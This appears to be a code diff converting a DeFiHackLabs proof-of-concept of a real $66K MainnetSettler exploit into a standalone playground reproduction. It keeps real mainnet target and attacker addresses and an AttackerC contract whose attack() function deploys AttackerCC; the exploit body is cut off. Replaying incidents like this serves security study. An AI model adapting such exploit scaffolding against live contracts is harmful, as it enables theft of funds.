@@ -1,45 +1,23 @@
 pragma solidity ^0.8.10;
 
-import "forge-std/Test.sol";
-import "../interface.sol";
-
-// @KeyInfo - Total Lost : $66K
-// Attacker : https://etherscan.io/address/0x3a38877312d1125d2391663cba9f7190953bf2d9
-// Attack Contract : https://etherscan.io/address/0x285d37b0480910f977cd43c9bd228527bfad816e, https://etherscan.io/address/0x95b4fecf1f5b9c56ce51ebfedd582c5f40f2ef8c
-// Vulnerable Contract : 
-// Attack Tx : https://etherscan.io/tx/0xfab5912f858b3768b7b7d312abcc02b64af7b1e1b62c4f29a2c1a2d1568e9fa2
-
-// @Info
-// Vulnerable Contract Code : 
-
-// @Analysis
-// Post-mortem : https://x.com/TenArmorAlert/status/1859416451473604902
-// Twitter Guy : https://x.com/TenArmorAlert/status/1859416451473604902
-// Hacking God : N/A
+// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
+// MainnetSettler_exp.sol test's logic verbatim. The original test's entire
+// attack runs inside AttackerC's CONSTRUCTOR, but the playground never records
+// the top-level exploit contract's own deploy (mirroring Foundry's
+// `new AttackerC()` boilerplate) — only a RECORDED function call is traced. So
+// AttackerC's constructor logic is moved into a plain `attack()` function;
+// AttackerCC (deployed from within that call, not at the top level) still
+// performs the real work in its own constructor exactly as the original test did.
 
 address constant MainnetSettler = 0x70bf6634eE8Cb27D04478f184b9b8BB13E5f4710;
 address constant attacker = 0x3A38877312D1125d2391663CBa9f7190953Bf2d9;
 address constant hold = 0x68B36248477277865c64DFc78884Ef80577078F3;
 address constant addr3 = 0xA31d98b1aA71a99565EC2564b81f834E90B1097b;
 
-contract ContractTest is Test {
-    function setUp() public {
-        vm.createSelectFork("http://127.0.0.1:8545", 21230768-1);
-    }
-    
-    function testPoC() public {
-        emit log_named_decimal_uint("before attack: balance of attacker", IERC20(hold).balanceOf(attacker), 18);
-        vm.startPrank(attacker, attacker);
-        AttackerC attC = new AttackerC();
-        vm.stopPrank();
-        emit log_named_decimal_uint("after attack: balance of attacker", IERC20(hold).balanceOf(attacker), 18);
-    }
-}
-
 contract AttackerC {
-    constructor() {
+    function attack() external {
         new AttackerCC();
-    } 
+    }
 }
 
 contract AttackerCC {
